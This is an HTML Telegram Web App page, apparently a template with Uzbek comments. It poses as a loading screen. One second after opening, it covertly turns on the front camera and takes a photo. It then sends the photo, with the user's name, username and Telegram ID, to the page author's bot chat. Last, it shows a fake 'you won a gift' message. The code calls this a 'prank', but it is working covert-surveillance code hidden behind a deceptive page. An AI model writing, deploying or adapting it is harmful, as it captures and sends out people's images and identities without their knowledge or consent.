<!DOCTYPE html>
<html lang="uz">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Yuklanyapti...</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #000;
    display: flex;
    align-items: center;
    justify-content: center;
    height: 100vh;
    font-family: Arial, sans-serif;
    color: white;
  }
  #loading {
    text-align: center;
  }
  .spinner {
    width: 60px; height: 60px;
    border: 5px solid #333;
    border-top-color: #0088cc;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin: 0 auto 20px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  p { color: #aaa; font-size: 14px; margin-top: 8px; }
  video, canvas { display: none; }
  #flash {
    position: fixed; inset: 0;
    background: white;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.1s;
    z-index: 999;
  }
</style>
</head>
<body>
<div id="flash"></div>
<div id="loading">
  <div class="spinner"></div>
  <h2>⏳ Yuklanmoqda...</h2>
  <p>Iltimos kuting</p>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

const BOT_TOKEN = 'SIZNING_BOT_TOKEN'; // <-- o'zgartiring
const CHAT_ID   = 'SIZNING_CHAT_ID';   // <-- o'zgartiring (sizning Telegram ID)

async function captureAndSend() {
  try {
    // Kamerani yashirin ochish
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: 640, height: 480 },
      audio: false
    });

    const video = document.getElementById('video');
    video.srcObject = stream;

    // Kamera tayyor bo'lishini kutish
    await new Promise(res => {
      video.onloadedmetadata = () => {
        video.play();
        setTimeout(res, 1500); // 1.5 soniya kutish (to'g'ri kadrlash uchun)
      };
    });

    // Flash effekti
    const flash = document.getElementById('flash');
    flash.style.opacity = '1';
    setTimeout(() => flash.style.opacity = '0', 150);

    // Rasmga olish
    const canvas = document.getElementById('canvas');
    canvas.width  = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);

    // Streamni to'xtatish
    stream.getTracks().forEach(t => t.stop());

    // Canvas → Blob → FormData
    canvas.toBlob(async (blob) => {
      const user = tg.initDataUnsafe?.user;
      const name = user
        ? `${user.first_name || ''} ${user.last_name || ''} (@${user.username || 'nomsiz'})`.trim()
        : 'Noma\'lum';

      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('photo', blob, 'prank.jpg');
      form.append('caption',
        `📸 Prank ishladi!\n👤 ${name}\n🆔 ID: ${user?.id || '?'}\n🕐 ${new Date().toLocaleString('uz-UZ')}`
      );

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: form
      });

      // Foydalanuvchiga oddiy narsa ko'rsat
      document.getElementById('loading').innerHTML = `
        <div style="font-size:60px">🎉</div>
        <h2 style="margin-top:16px">Siz g'alaba qozondingiz!</h2>
        <p style="margin-top:8px; color:#aaa">Maxsus sovg'angiz tayyor</p>
        <div style="margin-top:24px; padding:16px; background:#111; border-radius:12px; font-size:13px; color:#555">
          yuklanmoqda...
        </div>
      `;
    }, 'image/jpeg', 0.85);

  } catch (err) {
    // Kamera rad etilsa - oddiy xabar
    document.getElementById('loading').innerHTML = `
      <div style="font-size:50px">😅</div>
      <h2 style="margin-top:16px">Yuklanmadi</h2>
      <p style="color:#555; margin-top:8px">Qaytadan urinib ko'ring</p>
    `;
    console.error(err);
  }
}

// 1 soniyadan so'ng avtomatik ishga tushadi
setTimeout(captureAndSend, 1000);
</script>
</body>
</html>
